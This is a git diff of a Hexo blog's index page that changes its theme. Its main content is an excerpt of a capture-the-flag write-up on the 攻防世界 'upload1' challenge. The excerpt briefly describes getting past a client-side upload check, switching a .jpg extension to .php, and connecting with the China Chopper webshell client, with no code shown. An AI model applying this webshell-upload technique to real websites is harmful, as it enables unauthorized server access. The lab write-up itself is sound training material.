-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2019/12/28/攻防世界upload1总结/">攻防世界upload1总结</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2019-12-28T03:30:40.000Z" itemprop="datePublished">
-          2019-12-28
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-28&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB%EF%BC%8Cupload">WEB，upload</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/WEB，upload/'>WEB，upload</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        攻防世界web进阶区upload1打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/">
+        <p class="h4 index-header">攻防世界upload1总结</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">攻防世界web进阶区upload1打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。
 
 
 
@@ -617,110 +577,282 @@ strstr() 函数搜索字符串在另一字符串中的第一次出现。注释�
 
 
 
-然后打开菜刀进行连接。额。。。。失败了。然后
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2019/12/28/攻防世界upload1总结/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+然后打开菜刀进行连接。额。。。。失败了。然后进行百度发现我传入菜刀时，忘记修改后缀名，将jpg改成php。
+
+</div>
         </div>
+      </a>
+
+      <div>
         
-        <nav class="pagination" role="pagination">
-          <a class="pull-left" href="/page/4/">← Newer Posts</a>
-          <a class="pull-right" href="/page/6/">Older Posts →</a>
-        </nav>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-28&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB%EF%BC%8Cupload">WEB，upload</a>&nbsp;
+          
+        
+      </div>
     </div>
-</section>
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>我从登上过高山，也曾陷入过低谷这两者都使我受益良多。</p>
+  </div>
+
+
+
+  <nav aria-label="index posts navigation">
+    <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
+      <a class="extend prev" rel="prev" href="/page/4/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fas fa-angle-double-right"></i></a>
+    </span>
+  </nav>
+  
+  <script>
+    for (ele of document.getElementById("pagination").getElementsByClassName("page-number")) {
+      ele.href += '#board';
+    }
+  </script>
+
+
+
+              </div>
+            </div>
+          </div>
         </div>
+      </div>
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-</section>
-<!-- ============================ END Content =========================== -->
+  </div>
+</div>
+  
 
-      
-<!-- ============================ Footer =========================== -->
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
 
-<footer>
-    <div class="container">
-            <div class="copy">
-                <p>
-                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By . All Rights Reserved.
-                </p>
-                <p>Theme By <a href="//go.kieran.top" target="_blank" rel="noopener" style="color: #767D84">Kieran</a></p>
-            </div>
-            <div class="social">
-                <ul>
-                    
-                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
-                    
-                    
-                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
-                    
-                    
-                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
-                    
-                    
-                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
-                    
-                    
-                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
-                    
-                </ul>
-            </div>
-            <div class="clearfix"> </div>
-        </div>
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+  </div>
 </footer>
 
-<!-- ============================ END Footer =========================== -->
-      <!-- Load our scripts -->
-<!-- Resizable 'on-demand' full-height hero -->
-<script type="text/javascript">
-    var resizeHero = function () {
-        var hero = $(".cover,.heightblock"),
-            window1 = $(window);
-        hero.css({
-            "height": window1.height()
-        });
-    };
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
 
-    resizeHero();
 
-    $(window).resize(function () {
-        resizeHero();
+  <script src="/js/lazyload.js" ></script>
+
+
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "我用三生的期许 换回三世相思雨 三千浮沉里的你 迷失轮回的自己&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
     });
-</script>
-<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
-<script src="/js/scripts.js"></script><!-- Theme scripts -->
-
-
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-<script type="text/javascript">
-$('#intro').find('img').each(function(){
-  var alt = this.alt;
-
-  if (alt){
-    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
-  }
-
-  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
-});
-(function($){
-  $('.fancybox').fancybox();
-})(jQuery);
-</script>
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
 
 
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
       
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
 </body>
 </html>
